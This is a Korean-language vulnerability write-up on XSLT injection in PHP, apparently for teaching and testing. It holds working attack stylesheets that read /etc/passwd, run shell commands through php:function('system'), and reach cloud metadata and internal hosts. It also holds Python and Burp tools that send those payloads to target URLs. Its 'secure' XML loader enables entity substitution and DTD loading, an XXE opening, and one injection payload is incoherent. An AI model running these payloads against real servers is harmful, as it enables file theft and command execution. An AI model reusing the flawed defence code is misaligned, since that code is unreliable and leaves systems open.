# XSLT Injection 취약점 상세 분석

## 📋 개요

**XSLT (Extensible Stylesheet Language Transformations) Injection**은 웹 애플리케이션이 사용자 입력으로 받은 XSLT 스타일시트나 XML 데이터를 검증 없이 XSLT 프로세서에 전달할 때 발생하는 취약점입니다. 공격자는 악의적인 XSLT 코드를 주입하여 파일 시스템 접근, 임의 코드 실행, SSRF 등의 공격을 수행할 수 있습니다.

## 🎯 취약점 정보

- **CVSS 3.1 점수**: 9.1 (Critical)
- **공격 복잡성**: Low
- **필요 권한**: None
- **사용자 상호작용**: None
- **영향 범위**: Confidentiality, Integrity, Availability

## 🔍 취약점 원리

### 핵심 개념

XSLT Injection은 다음과 같은 상황에서 발생합니다:

1. **사용자 제어 XSLT**: 사용자가 XSLT 스타일시트를 직접 입력할 수 있음
2. **XML 데이터 조작**: XML 문서에 사용자 입력이 포함되어 XSLT 처리됨
3. **확장 함수 활성화**: XSLT 프로세서에서 위험한 확장 함수가 활성화됨
4. **외부 엔티티 허용**: `document()` 함수 등을 통한 외부 리소스 접근 허용

### XSLT 처리 플로우

```
[User Input] -> [XSLT Stylesheet] -> [XSLT Processor] -> [XML Document] -> [Output]
                      ↑                    ↑
                 [Injection Point]    [Vulnerable Engine]
```

## 🚨 공격 시나리오

### 1. 파일 시스템 접근 공격

**취약한 코드**:
```php
<?php
$xml = new DOMDocument();
$xml->loadXML($_POST['xml_data']);

$xsl = new DOMDocument();
$xsl->loadXML($_POST['xslt_template']); // 사용자 입력으로 XSLT 로드

$proc = new XSLTProcessor();
$proc->importStylesheet($xsl);
echo $proc->transformToXML($xml); // 위험한 변환
?>
```

**공격 벡터**:
```xml
<!-- 악의적인 XSLT 스타일시트 -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <!-- /etc/passwd 파일 내용 읽기 -->
        <xsl:value-of select="document('file:///etc/passwd')"/>
    </xsl:template>
</xsl:stylesheet>
```

### 2. PHP 함수 실행 공격

**공격 벡터**:
```xml
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
    <xsl:template match="/">
        <!-- 임의 PHP 함수 실행 -->
        <xsl:value-of select="php:function('system', 'whoami')"/>
        <xsl:value-of select="php:function('file_get_contents', '/etc/hosts')"/>
        <xsl:value-of select="php:function('exec', 'cat /etc/passwd')"/>
    </xsl:template>
</xsl:stylesheet>
```

### 3. 네트워크 기반 SSRF 공격

**공격 벡터**:
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <!-- 내부 네트워크 리소스 접근 -->
        <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
        <xsl:value-of select="document('http://localhost:8080/admin/config')"/>
        <xsl:value-of select="document('http://internal-api.company.com/users')"/>
    </xsl:template>
</xsl:stylesheet>
```

### 4. XML 데이터 조작을 통한 공격

**취약한 XML 구성**:
```php
$user_input = $_POST['username'];
$xml_data = "<users><user>$user_input</user></users>"; // 직접 삽입

$xslt = '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html><body>
            Hello, <xsl:value-of select="//user"/>
        </body></html>
    </xsl:template>
</xsl:stylesheet>';
```

**공격 페이로드**:
```xml
<!-- username 필드에 주입 -->
</user></users>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="document('file:///etc/passwd')"/>
    </xsl:template>
</xsl:stylesheet>
<users><user>
```

## 🛡️ 방어 방법

### 1. 입력 검증 및 화이트리스트

```php
class SecureXSLTProcessor {
    private $allowedElements = [
        'xsl:stylesheet', 'xsl:template', 'xsl:value-of', 
        'xsl:for-each', 'xsl:if', 'xsl:choose', 'xsl:when', 'xsl:otherwise'
    ];
    
    private $forbiddenElements = [
        'document', 'php:function', 'xsl:include', 'xsl:import'
    ];
    
    public function validateXSLT($xslt) {
        // 1. XML 구조 검증
        $doc = new DOMDocument();
        libxml_use_internal_errors(true);
        
        if (!$doc->loadXML($xslt)) {
            throw new InvalidArgumentException('Invalid XML structure');
        }
        
        // 2. 금지된 요소 검사
        foreach ($this->forbiddenElements as $forbidden) {
            if (strpos($xslt, $forbidden) !== false) {
                throw new SecurityException("Forbidden element detected: $forbidden");
            }
        }
        
        // 3. XPath를 통한 구조 검증
        $xpath = new DOMXPath($doc);
        
        // document() 함수 사용 검사
        $documentCalls = $xpath->query("//text()[contains(., 'document(')]");
        if ($documentCalls->length > 0) {
            throw new SecurityException('document() function not allowed');
        }
        
        // PHP 함수 호출 검사
        $phpCalls = $xpath->query("//*[contains(name(), 'php:')]");
        if ($phpCalls->length > 0) {
            throw new SecurityException('PHP functions not allowed');
        }
        
        return true;
    }
    
    public function secureTransform($xml, $xslt) {
        // 입력 검증
        $this->validateXSLT($xslt);
        
        // XSLT 프로세서 설정
        $proc = new XSLTProcessor();
        
        // 보안 설정
        $proc->setSecurityPrefs(XSL_SECPREF_NONE);
        $proc->setSecurityPrefs(
            XSL_SECPREF_READ_FILE |
            XSL_SECPREF_WRITE_FILE |
            XSL_SECPREF_CREATE_DIRECTORY |
            XSL_SECPREF_READ_NETWORK |
            XSL_SECPREF_WRITE_NETWORK
        );
        
        // 변환 수행
        $xslDoc = new DOMDocument();
        $xslDoc->loadXML($xslt);
        
        $proc->importStylesheet($xslDoc);
        return $proc->transformToXML($xml);
    }
}
```

### 2. 템플릿 기반 접근

```php
class TemplateXSLTProcessor {
    private $templates = [
        'user_list' => '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                <html><body>
                    <xsl:for-each select="//user">
                        <div><xsl:value-of select="name"/></div>
                    </xsl:for-each>
                </body></html>
            </xsl:template>
        </xsl:stylesheet>',
        
        'product_catalog' => '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                <html><body>
                    <xsl:for-each select="//product">
                        <div>
                            <h3><xsl:value-of select="name"/></h3>
                            <p><xsl:value-of select="description"/></p>
                        </div>
                    </xsl:for-each>
                </body></html>
            </xsl:template>
        </xsl:stylesheet>'
    ];
    
    public function transform($xmlData, $templateName) {
        if (!isset($this->templates[$templateName])) {
            throw new InvalidArgumentException('Template not found');
        }
        
        $xml = new DOMDocument();
        $xml->loadXML($xmlData);
        
        $xsl = new DOMDocument();
        $xsl->loadXML($this->templates[$templateName]);
        
        $proc = new XSLTProcessor();
        $proc->setSecurityPrefs(XSL_SECPREF_DEFAULT);
        $proc->importStylesheet($xsl);
        
        return $proc->transformToXML($xml);
    }
}
```

### 3. 외부 엔티티 비활성화

```php
function createSecureXSLTProcessor() {
    $proc = new XSLTProcessor();
    
    // 모든 보안 제약 활성화
    $proc->setSecurityPrefs(
        XSL_SECPREF_READ_FILE |      // 파일 읽기 금지
        XSL_SECPREF_WRITE_FILE |     // 파일 쓰기 금지
        XSL_SECPREF_CREATE_DIRECTORY | // 디렉토리 생성 금지
        XSL_SECPREF_READ_NETWORK |   // 네트워크 읽기 금지
        XSL_SECPREF_WRITE_NETWORK    // 네트워크 쓰기 금지
    );
    
    return $proc;
}

function secureXMLLoad($xmlString) {
    $prevValue = libxml_disable_entity_loader(true);
    
    $dom = new DOMDocument();
    $dom->resolveExternals = false;
    $dom->substituteEntities = false;
    
    $result = $dom->loadXML($xmlString, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
    
    libxml_disable_entity_loader($prevValue);
    
    return $result ? $dom : false;
}
```

### 4. 콘텐츠 보안 정책 (CSP)

```php
class XSLTSecurityMiddleware {
    public function process($request, $response) {
        // XSLT 관련 보안 헤더 설정
        $response->headers->set('Content-Security-Policy', 
            "default-src 'self'; script-src 'none'; object-src 'none'");
        
        // X-Frame-Options 설정
        $response->headers->set('X-Frame-Options', 'DENY');
        
        // XSLT 변환 결과에 대한 MIME 타입 검증
        if ($this->isXSLTResponse($response)) {
            $this->validateXSLTOutput($response->getContent());
        }
        
        return $response;
    }
    
    private function validateXSLTOutput($content) {
        // 위험한 JavaScript 패턴 검사
        $dangerousPatterns = [
            '/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/mi',
            '/javascript:/i',
            '/on\w+\s*=/i'
        ];
        
        foreach ($dangerousPatterns as $pattern) {
            if (preg_match($pattern, $content)) {
                throw new SecurityException('Dangerous content in XSLT output');
            }
        }
    }
}
```

## 🔍 취약점 탐지 방법

### 1. 정적 코드 분석

```bash
# PHP에서 XSLT 관련 위험한 패턴 검색
grep -r "XSLTProcessor" . --include="*.php"
grep -r "transformToXML" . --include="*.php"
grep -r "importStylesheet" . --include="*.php"
grep -r "setSecurityPrefs" . --include="*.php" || echo "보안 설정 누락 가능"

# 사용자 입력이 XSLT에 직접 사용되는 패턴
grep -r "loadXML.*\$_" . --include="*.php"
```

### 2. 동적 테스트 스크립트

```python
import requests
import base64

class XSLTInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = self.generate_payloads()
    
    def generate_payloads(self):
        return {
            'file_read': '''
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="/">
                        <xsl:value-of select="document('file:///etc/passwd')"/>
                    </xsl:template>
                </xsl:stylesheet>
            ''',
            
            'php_function': '''
                <xsl:stylesheet version="1.0" 
                    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                    xmlns:php="http://php.net/xsl">
                    <xsl:template match="/">
                        <xsl:value-of select="php:function('system', 'id')"/>
                    </xsl:template>
                </xsl:stylesheet>
            ''',
            
            'ssrf': '''
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="/">
                        <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
                    </xsl:template>
                </xsl:stylesheet>
            '''
        }
    
    def test_vulnerability(self):
        results = {}
        
        for payload_name, payload in self.payloads.items():
            try:
                data = {
                    'xml_data': '<data>test</data>',
                    'xslt_template': payload
                }
                
                response = requests.post(self.target_url, data=data, timeout=10)
                
                # 성공 지표 확인
                success_indicators = [
                    'root:x:0:0',  # /etc/passwd 내용
                    'uid=',        # id 명령 출력
                    'ami-',        # AWS 메타데이터
                    'instance-id'  # AWS 인스턴스 ID
                ]
                
                is_vulnerable = any(indicator in response.text.lower() 
                                  for indicator in success_indicators)
                
                results[payload_name] = {
                    'vulnerable': is_vulnerable,
                    'response_length': len(response.text),
                    'status_code': response.status_code
                }
                
                if is_vulnerable:
                    print(f"VULNERABLE: {payload_name}")
                
            except Exception as e:
                results[payload_name] = {'error': str(e)}
        
        return results

# 사용 예
tester = XSLTInjectionTester("https://target.com/xslt-processor")
results = tester.test_vulnerability()
```

### 3. Burp Suite 확장

```javascript
// Burp Suite XSLT Injection 탐지 확장
function processHttpMessage(toolFlag, messageIsRequest, messageInfo) {
    if (messageIsRequest) {
        var request = messageInfo.getRequest();
        var requestString = helpers.bytesToString(request);
        
        // XSLT 관련 파라미터 탐지
        var xsltParams = ['xslt', 'stylesheet', 'template', 'transform'];
        var hasXSLTParam = xsltParams.some(param => 
            requestString.toLowerCase().includes(param));
        
        if (hasXSLTParam) {
            // XSLT Injection 페이로드 삽입
            var payloads = [
                '<xsl:value-of select="document(\'file:///etc/passwd\')"/>',
                '<xsl:value-of select="php:function(\'system\', \'id\')"/>',
                '<xsl:value-of select="document(\'http://example.com/test\')"/>'
            ];
            
            payloads.forEach(payload => {
                var modifiedRequest = injectPayload(requestString, payload);
                var testResponse = callbacks.makeHttpRequest(
                    messageInfo.getHttpService(), 
                    helpers.stringToBytes(modifiedRequest)
                );
                
                analyzeResponse(testResponse, payload);
            });
        }
    }
}

function analyzeResponse(response, payload) {
    var responseString = helpers.bytesToString(response.getResponse());
    
    var vulnerabilityIndicators = [
        'root:x:0:0',
        'uid=',
        'gid=',
        'www-data',
        'daemon'
    ];
    
    if (vulnerabilityIndicators.some(indicator => 
            responseString.includes(indicator))) {
        
        callbacks.addScanIssue({
            url: response.getUrl(),
            name: "XSLT Injection Detected",
            detail: `Payload: ${payload}\nResponse contains system information`,
            severity: "High"
        });
    }
}
```

## 🧪 테스트 시나리오

### 시나리오 1: 파일 읽기 테스트

```php
<?php
// 테스트 대상 취약한 코드
if ($_POST['xml'] && $_POST['xslt']) {
    $xml = new DOMDocument();
    $xml->loadXML($_POST['xml']);
    
    $xsl = new DOMDocument();
    $xsl->loadXML($_POST['xslt']);
    
    $proc = new XSLTProcessor();
    $proc->importStylesheet($xsl);
    
    echo $proc->transformToXML($xml);
}
?>

<!-- 테스트 페이로드 -->
<form method="post">
    <textarea name="xml"><data>test</data></textarea>
    <textarea name="xslt">
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                Files: <xsl:value-of select="document('file:///etc/passwd')"/>
            </xsl:template>
        </xsl:stylesheet>
    </textarea>
    <button>Test</button>
</form>
```

### 시나리오 2: 자동화된 취약점 스캔

```python
import threading
import queue
import requests

def scan_xslt_injection(target_queue, results_queue):
    payloads = {
        'file_disclosure': {
            'xml': '<users><user>test</user></users>',
            'xslt': '''<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:template match="/">
                    <xsl:copy-of select="document('file:///etc/passwd')"/>
                </xsl:template>
            </xsl:stylesheet>'''
        },
        'code_execution': {
            'xml': '<data>test</data>',
            'xslt': '''<xsl:stylesheet version="1.0" 
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
                <xsl:template match="/">
                    <xsl:value-of select="php:function('system', 'whoami')"/>
                </xsl:template>
            </xsl:stylesheet>'''
        }
    }
    
    while not target_queue.empty():
        try:
            url = target_queue.get(timeout=1)
            
            for payload_name, payload in payloads.items():
                response = requests.post(url, data=payload, timeout=5)
                
                if is_vulnerable(response.text):
                    results_queue.put({
                        'url': url,
                        'payload': payload_name,
                        'vulnerable': True
                    })
            
        except queue.Empty:
            break
        except Exception as e:
            results_queue.put({
                'url': url,
                'error': str(e)
            })

def is_vulnerable(response_text):
    indicators = [
        'root:', 'daemon:', 'www-data:', 'nobody:',  # /etc/passwd
        'uid=', 'gid=',  # whoami/id 명령
        'Windows', 'Program Files'  # Windows 환경
    ]
    
    return any(indicator in response_text for indicator in indicators)

# 멀티스레드 스캐닝
targets = queue.Queue()
results = queue.Queue()

# 타겟 URL 추가
target_urls = ['http://example.com/xslt1', 'http://example.com/xslt2']
for url in target_urls:
    targets.put(url)

# 스레드 실행
threads = []
for i in range(5):  # 5개 스레드
    t = threading.Thread(target=scan_xslt_injection, args=(targets, results))
    t.start()
    threads.append(t)

# 결과 수집
for t in threads:
    t.join()

while not results.empty():
    result = results.get()
    print(f"Result: {result}")
```

## 📊 영향 평가

### 비즈니스 영향

- **데이터 유출**: 시스템 파일 및 데이터베이스 정보 노출
- **서비스 중단**: 시스템 리소스 고갈로 인한 DoS
- **규정 위반**: 개인정보 보호법, GDPR 등 위반 가능성
- **신뢰도 손상**: 보안 사고로 인한 고객 신뢰 실추

### 기술적 영향

- **임의 코드 실행**: 서버 시스템 완전 장악 가능
- **파일 시스템 접근**: 중요한 설정 파일 및 소스 코드 노출
- **네트워크 공격**: SSRF를 통한 내부 네트워크 침투
- **데이터 조작**: XML 데이터 구조 변경을 통한 로직 우회

## 🔧 수정 가이드

### 즉시 적용할 수정사항

1. **사용자 XSLT 입력 차단**
2. **XSLTProcessor 보안 설정 강화**
3. **템플릿 기반 XSLT 사용**
4. **입력 검증 및 화이트리스트 적용**

### 장기적 개선사항

1. **대안 기술 검토** (Twig, Smarty 등)
2. **WAF 규칙 구성**
3. **정기적 보안 감사**
4. **개발자 보안 교육**

## 📚 참고 자료

- [OWASP - XSLT Injection](https://owasp.org/www-community/vulnerabilities/XSLT_Injection)
- [CWE-91: XML Injection (aka Blind XPath Injection)](https://cwe.mitre.org/data/definitions/91.html)
- [PortSwigger - XSLT Injection](https://portswigger.net/web-security/xxe/xslt-injection)
- [PHP Security - XSL Security](https://www.php.net/manual/en/xsltprocessor.setsecurityprefs.php)

## 🎯 결론

XSLT Injection은 XML 변환 과정에서 발생하는 심각한 보안 취약점으로, 파일 시스템 접근부터 임의 코드 실행까지 다양한 공격이 가능합니다. 사용자 입력을 통한 XSLT 제어를 완전히 차단하고, 미리 정의된 템플릿 기반의 안전한 변환 방식을 사용하는 것이 가장 효과적인 방어 방법입니다.